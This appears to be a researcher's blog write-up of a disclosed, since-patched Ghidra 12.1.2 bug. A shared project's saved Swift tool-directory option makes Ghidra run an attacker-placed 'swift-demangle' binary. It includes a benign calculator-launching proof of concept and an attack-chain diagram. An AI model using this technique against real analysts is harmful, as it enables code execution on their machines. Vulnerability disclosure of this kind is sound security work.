---
icon: skull
cover: ../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 03_36_43 PM.png
coverY: 172.01328147885292
coverHeight: 331
---

# How I Found a 0-Day in Ghidra 12.1.2 , Shared Project File Became a Code Execution Vector.

<figure><img src="../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 04_52_30 PM.png" alt=""><figcaption></figcaption></figure>

## What If Opening Someone Else's Ghidra Project Could Run Code on Your Machine?

What if I told you that in Ghidra 12.1.2, a reverse engineer could open a project someone shared with them a teammate's CTF workspace, a file from GitHub, a downloaded case and that alone could silently execute arbitrary code on their machine?

No network connection required. No special privileges needed. No prompt, no warning, no indication anything happened. Just: open project → analysis runs → attacker binary executes.

That's the bug. Let me walk you through how I found it.

{% hint style="info" %}
At the time of discovery, Ghidra 12.1.2 was the latest stable release shipped June 5, 2026. This vulnerability was reported just one day after release, making it a true 0-day: unknown to the vendor, present in the newest version, unpatched, and with no CVE assigned. Every Ghidra user running 12.1.2 (the current version at the time) was affected. The NSA/Ghidra team accepted the report, fixed it in commit c03a70d, and the patch will ship in 12.1.3 meaning 12.1.2 remains the affected version for all users until that release lands.
{% endhint %}

***

### The Setup Why I Was Looking at Ghidra's Internals

Ghidra is the NSA's open-source reverse engineering framework. If you've done any serious binary analysis you've probably lived in it. It's also a massive Java codebase hundreds of analyzers that fire automatically when you open a binary. Each analyzer is a small program with its own config, its own state, and often its own interaction with external tools.

I was doing an independent code review of Ghidra 12.1.2 looking for code-execution conditions. Not web vulns, not logic bugs specifically looking for places where Ghidra might execute something it shouldn't, or where attacker-controlled input could reach a process-launch sink.

My working directory:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra]
└─$ ls -la
drwxr-xr-x  ghidra-12.1.2/       ← source tree
drwxr-xr-x  research/            ← my notes, poc scripts
-rw-r--r--  classification.md
-rw-r--r--  source-evidence.md
```

The game plan was simple: find analyzer code that interacts with native/external binaries, trace where the binary path comes from, and check if that path can be influenced by attacker-controlled input.

***

### Finding the Surface

Ghidra ships with an analyzer for Swift binaries specifically for demangling Swift symbol names. Swift mangling is complex enough that Ghidra delegates it to Apple's own `swift-demangle` binary rather than reimplementing it in Java.

I started looking at the analyzer's code. Here's the file that first caught my attention:

**`Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftDemanglerAnalyzer.java`**

The analyzer does two things that are immediately interesting:

1. It reads a `swiftToolDir` option a configurable path to where the Swift tools live
2. It passes that path to `SwiftNativeDemangler` which then launches the binary

```java
// SwiftDemanglerAnalyzer.java
String swiftDir = options.getString(SWIFT_TOOL_DIR_OPTION, null);
SwiftNativeDemangler demangler = new SwiftNativeDemangler(new File(swiftDir));
```

A configurable binary path. That's interesting. The question is _who can set that path?_

***

### Tracing the Sink

#### Following the Code into SwiftNativeDemangler

The actual process launch is in the sibling file:

**`Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftNativeDemangler.java`**

Here's the source-to-sink chain. This is the full execution path from config to shell:

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

So Ghidra calls the binary _twice_ once with `--version` to validate it exists, and once during actual symbol demangling. Whatever executable lives at `<swiftToolDir>/swift-demangle` gets run.

No hash check. No signature verification. No integrity check of any kind.

**Why this matters:** Any code sitting at that path will execute with full Ghidra process privileges. This is already a configurable code execution path but at this point I'm thinking "user misconfiguration." Then I dug into where the option actually comes from.

***

### The Real Vulnerability: Silent State Restoration

<figure><img src="../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 05_00_38 PM.png" alt=""><figcaption></figcaption></figure>

#### This Is the Part That Changes Everything

I went back to the analyzer and looked at how `SWIFT_TOOL_DIR_OPTION` gets populated. And here's where it gets interesting:

```java
// SwiftDemanglerAnalyzer.java
@Override
public void optionsChanged(Options options, Program program) {
    swiftToolDir = options.getString(SWIFT_TOOL_DIR_OPTION, "");
}
```

The analyzer doesn't ask you to configure the Swift directory every time. It reads from `options` which in Ghidra is the **saved analyzer state embedded inside the project file itself**.

This means:

1. A Ghidra `.gpr` project file (or the workspace it points to) can carry `SWIFT_TOOL_DIR_OPTION` baked in
2. When you open that project, Ghidra silently restores all analyzer options from the saved state
3. The Swift tool directory value is now set **without you ever seeing or configuring it**
4. When you run analysis, the Swift analyzer launches whatever binary is at that restored path

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

No prompt. No warning. Analysis just runs, and your code runs with it.

**Why this is the critical insight:** the Ghidra maintainer initially closed the report as "working as intended" thinking I was describing a user who had manually misconfigured their own Swift directory. Once I walked him through the project-import path showing that the attacker controls the state that gets silently loaded he immediately understood. His response:

> _"Thank you, I am seeing what you are describing now. I could restrict the analyzer to only call swift from the PATH, which would address this exact issue."_

That's when the report went from "won't fix" to an accepted finding with a committed patch.

***

### Building the PoC

#### The research\_poc.py Framework

Rather than write a one-shot script, I built a modular research framework that cleanly demonstrates the sink without needing a full Ghidra installation. Let me walk through exactly how it works against the vulnerability.

**Running it:**

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ python3 research_poc.py --mode swift
```

```
10:14:22 | INFO    | Ghidra 12.1.2 research framework v2.0.0 (sn0x-sharma)
10:14:22 | INFO    | == validating environment ==
10:14:22 | INFO    | == running research components ==
10:14:22 | INFO    | running component: swift-ace
10:14:22 | INFO    | swift-ace: dry run (pass --execute to launch the fake tool)
10:14:22 | INFO    | == collecting evidence ==
10:14:22 | INFO    | == generating summary ==
10:14:22 | INFO    | [PASS   ] swift-ace: Fake Swift demangler staged; not executed (dry run).
```

This is dry run it creates the fake tool directory but launches nothing. Let me show you what the framework actually builds.

#### How the Fake Demangler Gets Written

The critical function is `_write_fake_demangler()` in the `SwiftAnalyzer` class (lines 530–549 of `research_poc.py`):

```python
def _write_fake_demangler(self, fake_tool: Path, marker: Path) -> None:
    lines = [self.profile.script_header]   # line 537: #!/bin/sh on Linux
    if self.profile.is_windows:
        lines.append("echo Swift demangler calc PoC (sn0x-sharma)\n")
        lines.append(f'echo ran with: %* > "{marker}"\n')
        if self.config.launch_calc:
            lines.append("start \"\" calc.exe\n")
    else:
        lines.append("echo 'Swift demangler calc PoC (sn0x-sharma)'\n")
        lines.append(f'printf "ran with: %s\\n" "$*" > "{marker}"\n')  # ← captures args Ghidra passed
        if self.config.launch_calc:
            lines.append(f"({self.profile.calc_shell_command()}) &\n")  # ← spawns calc
    fake_tool.write_text("".join(lines), encoding="utf-8")
    self.profile.mark_executable(fake_tool)   # line 549: chmod +x
```

**Against the vulnerability:**

* The script is placed exactly at the path Ghidra would look for: `<swiftToolDir>/swift-demangle`
* It's made executable (line 549) just like a real binary
* When Ghidra calls `swift-demangle --version` (SINK 1), our fake binary runs instead
* The `$*` capture records what args Ghidra passed proving it was called with `--version` exactly as `SwiftNativeDemangler.java` would call it
* The marker file drops to disk proving execution happened

This directly mirrors the real-world attack:

<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

#### Platform Detection - Why It Matters

Lines 95–176 handle platform differences. The `PlatformProfile` class resolves everything once at startup:

```python
@property
def demangler_filename(self) -> str:
    return "swift-demangle.cmd" if self.is_windows else "swift-demangle"  # line 137
```

On Windows, Ghidra would look for `swift-demangle.cmd` — so our fake tool needs that name exactly. On Linux/macOS, it's just `swift-demangle`. The PoC gets both right, making it a faithful reproduction on any platform.

#### Now with execution the full PoC:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ python3 research_poc.py --mode swift --execute --launch-calc
```

```
10:15:09 | INFO    | Ghidra 12.1.2 research framework v2.0.0 (sn0x-sharma)
10:15:09 | INFO    | == validating environment ==
10:15:09 | INFO    | == running research components ==
10:15:09 | INFO    | running component: swift-ace
10:15:09 | INFO    | swift-ace: launching fake demangler as Ghidra would
Swift demangler calc PoC (sn0x-sharma)
10:15:09 | INFO    | [PASS   ] swift-ace: Swift demangler sink reproduced; attacker binary executed.
10:15:09 | INFO    |     - Fake Swift tool directory: artifacts/swift-demangler-calc/fake-swift-bin
10:15:09 | INFO    |     - Fake demangler: artifacts/swift-demangler-calc/fake-swift-bin/swift-demangle
10:15:09 | INFO    |     - Simulated Ghidra launch: swift-demangle --version
10:15:09 | INFO    |     - Execution marker: artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt

Artifacts written:
    - artifacts/swift-demangler-calc/fake-swift-bin/swift-demangle
    - artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
```

Calculator pops. Marker file proves execution:

```
┌──(sn0x㉿sn0x)-[~/0dev/Ghidra/research]
└─$ cat artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
ran with: --version
```

That `--version` is the argument `SwiftNativeDemangler.java` passes at its first launch SINK 1 the validation call. Proof that our fake binary executed in exactly the position Ghidra would execute the real attacker binary.

***

### The Orchestration How the Framework Runs

The `ResearchRunner` class (lines 852–928) ties everything together:

```python
def run(self) -> int:
    stage("checking prerequisites")
    components = self._build_components()              # line 884: builds SwiftAnalyzer etc.
    env = EnvironmentValidator(...).validate(components)  # line 887: preflight checks
    if not env.ok:
        return 3                                       # line 890: fail fast

    stage("running research components")
    results = []
    for component in components:
        if component.requires_source and self.scanner is None:
            results.append(ComponentResult(...SKIPPED))  # line 903: skip if no source tree
            continue
        results.append(component.run())                # line 907: run it

    ReportGenerator(self.evidence).generate(results)   # line 919: write summary
    return self._exit_code(results)                    # line 921: 0 or 2
```

`SwiftAnalyzer` has `requires_source = False` (line 466) meaning it needs no Ghidra source tree to run. This is intentional: the ACE sink is fully reproducible by just creating the fake tool directory. The PoC is self-contained.

Compare this to `TraceManager` and `SevenZipProbe` which have `requires_source = True` they need the actual Ghidra source to scan for their sinks.

***

### The Disclosure Timeline

```
June 6 2026 Filed GHSA-pcfh-853f-q3gh privately via GitHub Security Advisory
Week 2  Maintainer "This is working as intended. We do not consider it a security issue."
Week 3  I explain the silent project-import reproduction path in detail
Week 4  Maintainer : "Thank you, I am seeing what you are describing now."
Week 4  Fix committed: c03a70d
Week 5  Report accepted
Week 7  CVE Assigned 
```

The pushback moment was expected. "Working as intended" is the standard first response to any finding that requires a precondition. The key is having a concrete reproduction path that makes the attacker-controlled scenario undeniable which the project-import chain does.

***

### The Fix

NSA  fix in `c03a70d` restricts the Swift analyzer to only call `swift-demangle` from the system `PATH`, eliminating the configurable tool directory entirely:

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/NationalSecurityAgency/ghidra/commit/c03a70d" %}

This breaks the attack chain at the source: even if a malicious project carries a `swiftToolDir` option, it no longer has any effect on which binary gets executed.

***

### Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│  ATTACKER                                                               │
│  1. Creates attacker-controlled directory: /tmp/evil-swift/             │
│  2. Drops malicious binary at: /tmp/evil-swift/swift-demangle           │
│  3. Opens Ghidra, sets Swift Tool Dir option to /tmp/evil-swift/        │
│  4. Saves project → swiftToolDir persisted in project .gpr state        │
│  5. Shares project file with victim                                     │
└────────────────────────────┬────────────────────────────────────────────┘
                             │
                    (project file transferred)
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  VICTIM                                                                 │
│  6. Opens shared project (File → Open Project)                          │
│  7. Loads any binary → triggers analysis                                │
│  8. SwiftDemanglerAnalyzer fires → reads swiftToolDir from project state│
│  9. SwiftNativeDemangler builds path: /tmp/evil-swift/swift-demangle    │
│ 10. Ghidra executes binary with --version → ATTACKER CODE RUNS          │
│ 11. Ghidra executes binary again during demangling → ATTACKER CODE RUNS │
│                                                                         │
│  Result: ACE in Ghidra user context                                     │
│          In headless/CI: full host compromise under process user         │
└─────────────────────────────────────────────────────────────────────────┘
```

***

### Closing Thoughts

The thing that makes this finding interesting isn't that Ghidra executes a binary — lots of tools do that. It's the trust-boundary gap: the configured binary path lives inside the project state, and Ghidra treats restored project state as implicitly trusted. There's no prompt, no trust marker, no user confirmation when project-supplied analyzer options get applied.

For most tools, "open a file from the internet" is the risk model. For Ghidra, "open a project from a teammate" is also the risk model and that's a workflow RE analysts do constantly.

The fix is clean: just use PATH and nothing else. One commit, problem gone.

***

_Advisory: GHSA-pcfh-853f-q3gh | Fix: c03a70d | CVE: Pending (VulnCheck)_ _sn0x-sharma | sanketsharmacsec@gmail.com_

